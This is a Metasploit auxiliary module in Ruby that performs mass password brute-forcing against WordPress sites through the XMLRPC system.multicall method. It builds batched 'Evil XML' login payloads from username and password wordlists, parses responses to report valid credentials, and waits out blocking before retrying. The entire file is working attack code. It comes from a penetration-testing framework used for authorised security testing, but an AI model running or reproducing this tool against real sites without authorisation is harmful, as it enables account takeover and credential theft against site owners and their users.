##
# This module requires Metasploit: http://www.metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HTTP::Wordpress

  def initialize(info = {})
    super(update_info(
            info,
            'Name'         => 'WordPress XMLRPC Massive Bruteforce ',
            'Description'  => %q{Wordpress Massive Burteforce attacks via wordpress XMLRPC service.},
            'License'      => MSF_LICENSE,
            'Author'       =>
                [
                  'Sabri (@KINGSABRI)',           # Module Writer
                  'William (WCoppola@Lares.com)'  # Module Requester
                ],
            'References'   =>
                [
                  ['URL', 'https://blog.cloudflare.com/a-look-at-the-new-wordpress-brute-force-amplification-attack/'],
                  ['URL', 'https://blog.sucuri.net/2014/07/new-brute-force-attacks-exploiting-xmlrpc-in-wordpress.html']
                ]
          ))

    register_options(
        [
          OptPath.new('WPUSER_FILE', [true, 'File containing usernames, one per line',
                                      File.join(Msf::Config.data_directory, "wordlists", "http_default_users.txt") ]),
          OptPath.new('WPPASS_FILE', [true, 'File containing passwords, one per line',
                                      File.join(Msf::Config.data_directory, "wordlists", "http_default_pass.txt")]),
          OptInt.new('BLOCKEDWAIT', [true, 'Time(minutes) to wait if got blocked', 6])
        ], self.class)


    register_advanced_options(
        [
          OptInt.new('THREADS', [true, 'The number of concurrent threads', 5]),
          OptInt.new('TIMEOUT', [true, 'The maximum time in seconds to wait for each request to finish', 5])
        ], self.class)
  end

  def usernames
    File.readlines(datastore['WPUSER_FILE']).map {|user| user.chomp}
  end

  def passwords
    File.readlines(datastore['WPPASS_FILE']).map {|pass| pass.chomp}
  end

  def generate_xml(user)

    vprint_warning('Generating XMLs may take a while depends on the list file(s) size.') if passwords.size > 1500
    xml_payloads = []                          # Container for all generated XMLs
    xml = ""
    # Evil XML | Limit number of log-ins to 1700/request for wordpress limitation
    passwords.each_slice(1500) do |pass_group|

      document = Nokogiri::XML::Builder.new do |xml|
        xml.methodCall {
          xml.methodName("system.multicall")
          xml.params {
          xml.param {
          xml.value {
          xml.array {
          xml.data {

        pass_group.each  do |pass|
          xml.value {
          xml.struct {
          xml.member {
          xml.name("methodName")
          xml.value { xml.string("wp.getUsersBlogs") }}
            xml.member {
            xml.name("params")
            xml.value {
            xml.array {
            xml.data {
            xml.value {
            xml.array {
              xml.data {
                xml.value { xml.string(user) }
                xml.value { xml.string(pass) }
          }}}}}}}}}
        end

          }}}}}}
      end

      xml_payloads << document.to_xml
    end

    vprint_status('Generating XMLs just done.')
    xml_payloads
  end


  #
  # Check target status
  #
  def check_wpstatus
    print_status("Checking #{peer} status!")

    if !wordpress_and_online?
      print_error("#{rhost}:#{rport}#{target_uri} does not appear to be running WordPress or you got blocked!")
      return
    elsif !wordpress_xmlrpc_enabled?
      print_error("#{rhost}:#{rport}#{target_uri} does not enable XMLRPC")
      return
    else
      print_status("Target #{peer} is running Wordpress")
    end
  end

  def run
    check_wpstatus

    usernames.each do |user|
      passfound = false

      print_status("Bruteforcing user: #{user}")
      generate_xml(user).each do |xml|
        break if passfound == true

        opts =
            {
              'method'  => 'POST',
              'uri'     => wordpress_url_xmlrpc,
              'data'    => xml,
              'ctype'   =>'text/xml'
            }

        client = Rex::Proto::Http::Client.new(rhost)
        client.connect
        request  = client.request_cgi(opts)
        response = client.send_recv(request)

        # Request Parser
        req_xml = Nokogiri::Slop xml
        # Response Parser
        res_xml = Nokogiri::Slop response.to_s.scan(/<.*>/).join

        begin
          res_xml.document.methodResponse.params.param.value.array.data.value.each_with_index do |value, i|
            begin
              # If this gives exception then its the correct password
              value.struct.member[1].value.string.text
            rescue
              user = req_xml.document.methodCall.params.param.value.array.data.value[i].struct.member[1].value.array.data.value.array.data.value[0].text.strip
              pass = req_xml.document.methodCall.params.param.value.array.data.value[i].struct.member[1].value.array.data.value.array.data.value[1].text.strip

              print_good("Credentials Found! #{user}:#{pass}")
              passfound = true
            end end
        rescue NoMethodError
          print_error('It seems you got blocked!')
          print_warning("I'll sleep for #{datastore['BLOCKEDWAIT']} minutes then I'll try again. CTR+C to exit")
          sleep datastore['BLOCKEDWAIT'] * 60
          retry
        end
        sleep 2
      end end end

end
